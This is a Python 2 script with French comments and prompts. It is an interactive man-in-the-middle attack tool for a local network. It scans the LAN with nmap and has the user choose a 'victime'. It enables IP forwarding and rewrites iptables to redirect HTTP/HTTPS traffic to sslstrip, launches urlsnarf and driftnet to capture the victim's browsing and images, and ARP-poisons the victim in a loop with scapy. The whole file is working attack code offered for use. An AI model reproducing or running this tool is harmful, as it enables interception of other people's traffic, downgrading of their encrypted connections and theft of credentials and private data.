import os
import argparse
from subprocess import *
from scapy.all import *
from sys import *

#Couleur console
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
B  = '\033[34m' # blue
T  = '\033[93m' # tan
GR = '\033[37m' # gray

DN = open(os.devnull, 'w')

def parser_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-vip", "--vipaddress", help="Saisir l'adresse d'une victime")
    parser.add_argument("-i", "--interface", help="Saisir le nom de l'interface")
    parser.add_argument("-rip", "--routerip", help="Saisir l'adresse du router")
    return parser.parse_args()

class User():
    IPandMAC = []
    
    def poisoning(self,Interface, Routerip, Victim_addr):
        print '---------------------------------------------'
        print B+"[*] Lancement du Poisoning : [*]"+W
        conf.iface= Interface
        pkt = ARP()
        pkt.psrc = Routerip
        pkt.pdst = Victim_addr
        try:
            while 1:
                send(pkt, verbose=True)
                time.sleep(5.0)
        except KeyboardInterrupt:
            pass
    
    def user_on_the_lan(self, IP_Prefix, Routerip):
        print "[*] Lancement du Scan ARP afin d'identifier les machines sur le reseau. L'operation peut prendre un peu de temps - [nmap -sn %s :\n" % IP_Prefix
        iplist = []
        maclist = []
        try:
            nmap = Popen(['nmap', '-sn', IP_Prefix], stdout=PIPE, stderr=DN)
            nmap = nmap.communicate()[0]
            nmap = nmap.splitlines()[2:-1]
        except Exception:
            print '[-] Le Scan ARP a echoue, installer nmap !'
        for x in nmap:
            if 'Nmap' in x:
                pieces = x.split()
                nmapip = pieces[len(pieces)-1]
                nmapip = nmapip.replace('(','').replace(')','')
                iplist.append(nmapip)
            if 'MAC' in x:
                nmapmac = x.split()[2]
                maclist.append(nmapmac)
        zip_list = zip(iplist, maclist)
        print '[*] '+T+'Adresse IP'+W+' et '+R+'Address MAC'+W
        print '---------------------------------------------'
        for x in zip_list:
            if x[0] in Routerip:
                print '['+T+x[0]+W+']<------>['+R+x[1]+W+']'+" [x] <|"+GR+"Router/Passerelle par defaut"+W
            else:
                print '['+T+x[0]+W+']<------>['+R+x[1]+W+']'+" [x] <|"+GR+"Victime"+W 
        return zip_list

def print_all_vars(Victim_addr, Routerip, Interface, list_user):
    for x in list_user:
        if x[0] == Victim_addr:
            Victim_MAC = x[1]
        if x[0] == Routerip:
            RouterMac = x[1]
    print '---------------------------------------------'
    print B+"[*] Resumer de l'attaque [*]"+W
    print T+"[*] Adresse IP Victime :"+G+Victim_addr+W
    print T+"[*] Adresse MAC Victime:"+G+Victim_MAC+W
    print T+"[*] Adresse IP Router  :"+G+Routerip+W
    print T+"[*] Adresse MAC Router :"+G+RouterMac+W
    print T+"[*] Interface Utilise  :"+G+Interface+W

def settings_iptables(Interface):
    print '---------------------------------------------'
    print B+"[*] Configuration du Forwarding [*]"+W

#Activation du forward 
    f = open("/proc/sys/net/ipv4/ip_forward", "w")
    f.write('1')
    f.close()
    f = open("/proc/sys/net/ipv4/conf/" + Interface + "/send_redirects", "w")
    f.write('0')
    f.close()
    print G+"   > " + "IP FORWARDING ["+R+"OK"+G+"]"+W
    print G+"   > " + "BLOCAGE ICMP  ["+R+"OK"+G+"]"+W
    
  #Nettoyage des regles puis mise en place de la conf pour le forwarding
    os.system("/sbin/iptables --flush")
    os.system("/sbin/iptables -t nat --flush")
    os.system("/sbin/iptables --zero")
    os.system("/sbin/iptables -A FORWARD --in-interface " +  Interface + " -j ACCEPT")
    os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + Interface + " -j MASQUERADE")
  #forward des flux des ports 80 et 443 vers le port d'ecoute 10000 d'sslstrip
  #  os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport " + "80" + " --jump DNAT --to-destination " + "192.168.1.11")
  #  os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport " + "443" + " --jump DNAT --to-destination " + "192.168.1.11")
  #for port in args.ports.split(","):
  #  os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport " + port + " --jump DNAT --to-destination " + args.proxy)
    
def launch_sslstrip():
    choose = raw_input("[?] Souhaitez vous lancez SSLStrip ? (y/n) :")
    if choose == "n":
        print(R+"[+] SSLStrip non Lance !"+W)
        pass
    elif choose == "y":
        try:
            os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport " + "80" + " --jump REDIRECT --to-port " + "10000")
            os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport " + "443" + " --jump REDIRECT --to-port " + "10000")
            print G+"   > " + "NETTOYAGE IPTABLES["+R+"OK"+G+"]"+W
            print G+"   > " + "ROUTAGE DES FLUX  ["+R+"OK"+G+"]"+W
            print G+"   > " + "Lancement d'SSLStrip en tache de fond ["+R+"OK"+G+"]"+W
            os.popen("xterm -e sslstrip -w log_ssl.txt -a -l 10000 -f &")
        except Excreption:
            print(R+"SSLStrip a echoue!"+W)
            sys.exit(1)

def launch_urlsnarf(interface):
    choose = raw_input("[?] Souhaitez vous lancez URLSnarf ? (y/n) :")
    if choose == "n":
        print(R+"[+] URLSnarf non Lancer !"+W)
        pass
    elif choose == "y":
        try:
            print G+"   > " + "Lancement d'URLSnarf en tache de fond ["+R+"OK"+G+"]"+W
            os.popen("xterm -e urlsnarf -i " + interface + " &")
        except Exception:
            print(R+"URLSnarf a echoue!"+W)
            sys.exit(1)

def launch_drifnet(interface):
    choose = raw_input("[?] Souhaitez vous lancez Drifnet ? (y/n) :")
    if choose == "n":
        print(R+"[+] Drifnet non Lancer !"+W)
        pass
    elif choose == "y":
        try:
            print G+"   > " + "Lancement de Drifnet en tache de fond ["+R+"OK"+G+"]"+W
            os.popen("xterm -e driftnet -i " + interface + " &")
        except Exception:
            print(R+"Drifnet a echoue!"+W)
            sys.exit(1)
                  
def main(args):
    global Victim_addr, Interface, Routerip, IP_Prefix
    
    #Verification du lancement du programme avec les droits root
    if not os.geteuid()== 0:
        exit("\n Lancer le programme avec les droits Root\n")

    #Recherche de l'ip de la passerelle par default et de l'interface
    ip_addr = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
    ip_addr = ip_addr.communicate()[0]
    ip_addr_split = ip_addr.split('\n')
    ip_addr = ip_addr.split()

    #Recherche de l'adresse ip du router/passerelle par default
    if args.routerip:
        Routerip = args.routerip
    else:
        Routerip = ip_addr[2]
    #Recherche du Prefix de l'adresse ip du router/passerelle par default
    for val in ip_addr_split:
        if '/' in val:
            IP_Prefix = val.split()[0]
    #Recherche de l'interface
    if args.interface:
        Interface = args.interface
    else:
        Interface = ip_addr[4]
    #Recherche de l'adresse ip de la victime
    if args.vipaddress:
        Victim_addr = args.vipaddress
    else:
        us = User()
        list_user = us.user_on_the_lan(IP_Prefix, Routerip)
        reponse = 0
        while (reponse == 0):
            rep = raw_input("[*] Souhaitez vous relancer le Scan ? [y/n]: ")
            if 'y' in rep:
                us.user_on_the_lan(IP_Prefix, Routerip)
            elif 'n' in rep:
                reponse = 1
            if not 'y' in rep and not 'n' in rep:
                print "Vous devez choisir."
        rep = 0
        while (rep == 0):
            Victim_addr = raw_input("[*] Taper l'adresse de votre victime: ")
            is_present = 0
            for x in list_user:
                if Victim_addr == x[0]:
                    is_present = 1
            if is_present == 1:
                print G+"Saisie Valide"+W
                rep = 1
            else:
                print R+"Saisie Non Valide !"+W
        print_all_vars(Victim_addr, Routerip, Interface, list_user)
        settings_iptables(Interface)
        launch_sslstrip()
        launch_urlsnarf(Interface)
        launch_drifnet(Interface)
        us.poisoning(Interface, Routerip, Victim_addr)

if __name__ == "__main__":
    main(parser_argument())
